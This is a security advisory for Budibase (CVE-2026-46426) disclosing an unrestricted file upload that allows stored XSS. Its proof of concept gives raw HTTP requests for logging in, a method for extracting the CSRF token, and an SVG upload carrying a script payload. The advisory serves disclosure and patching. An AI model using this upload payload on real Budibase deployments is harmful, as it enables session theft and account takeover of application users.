# [H] Budibase: Unrestricted Upload of File with Dangerous Type

## Summary
Severity: High
Advisory: GHSA-82rc-gxrg-v4gf
CVE: CVE-2026-46426
CWE: CWE-434, CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-82rc-gxrg-v4gf
Type: github-advisory

## Affected
- npm: `budibase` — affected >=0 <3.38.2

## Details
### Summary
The file upload endpoint `POST /api/attachments/process` does not enforce active-content restrictions for authenticated users. The checks for dangerous file extensions (`html`, `svg`, `js`, `php`, etc.) are conditionally wrapped inside `if (isPublicUser)` or `if (isPublicUser || !env.SELF_HOSTED)`, meaning any authenticated builder can upload executable web content — SVG files with inline `<script>` tags, HTML pages with JavaScript, `.js` modules — which are then stored in the object store (MinIO/S3) with their correct MIME types (`image/svg+xml`, `text/html`, `application/javascript`). When the resulting signed URL is opened by any app user, the browser executes the payload.

Impact is **persistent stored XSS** over all application end users.

### Details
The vulnerability exists in a single handler function uploadFile shared by two routes, located in packages/server/src/api/controllers/static/index.ts (lines 93–179).

Route definitions (packages/server/src/api/routes/static.ts):

POST /api/attachments/process              → authorized(BUILDER)
POST /api/attachments/:tableId/upload      → authorized(PermissionType.TABLE, PermissionLevel.WRITE)
Both routes invoke the same uploadFile function. The second endpoint is accessible to any authenticated app user (BASIC or POWER role) who has been granted WRITE on any table — not just builders.

### PoC

### Prerequisites

- Budibase self-hosted Docker deployment, any version ≤ 3.30.6
- An account with Builder role (does **not** require admin)
- Target app published and accessible to end users

### Step 1 — Authenticate as builder

```http
POST /api/global/auth/default/login HTTP/1.1
Host: target:10000
Content-Type: application/json

{"username":"builder@company.com","password":"BuilderPass1!"}
```

```
HTTP/1.1 200 OK
Set-Cookie: budibase:auth=<jwt>; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT
Set-Cookie: budibase:auth.sig=<sig>; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT

{"message":"Login successful"}
```

The CSRF token is bound to the session. Browsers send it automatically via the Budibase
frontend JS. For scripted requests, decode the JWT payload (base64url second segment) to
extract `sessionId`, then read the Redis key `session-<userId>/<sessionId>` → `csrfToken`.

### Step 2 — Upload SVG with XSS payload

```http
POST /api/attachments/process HTTP/1.1
Host: target:10000
Cookie: budibase:auth=<jwt>; budibase:auth.sig=<sig>
x-budibase-app-id: <dev_app_id>
x-csrf-token: <csrf_token>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXXXXXXXXXXXXXXXX
Content-Length: 391

------WebKitFormBoundaryXXXXXXXXXXXXXXXX
Content-Disposition: form-data; name="file"; filename="xss.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
------WebKitFormBoundaryXXXXXXXXXXXXXXXX--
```

```json
HTTP/1.1 200 OK

[{"size":207,"name":"xss.svg","url":"http://target:10000/files/signed/.../<uuid>.svg?X-Amz-...","extension":"svg","key":"workspace_id/attachments/<uuid>.svg"}]
```
### Impact
* App end users - Stored XSS on any screen containing the attachment URL. Session cookie theft → full account takeover. |
* Builder accounts - If malicious URL is shared within the workspace (table attachment, embedded image), XSS fires in builder's session → workspace takeover. 


<img width="3087" height="1489" alt="image" src="https://github.com/user-attachments/assets/b0ee0263-85de-430e-9575-88ec91eae565" />


<img width="2100" height="1016" alt="image" src="https://github.com/user-attachments/assets/5133bb1e-f637-479e-952f-14b3265129b4" />







--------
Discovered By:
Abdulrahman Albatel
Abdullah Alrasheed

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-82rc-gxrg-v4gf
- https://nvd.nist.gov/vuln/detail/CVE-2026-46426
- https://github.com/Budibase/budibase
- https://github.com/Budibase/budibase/releases/tag/3.38.2
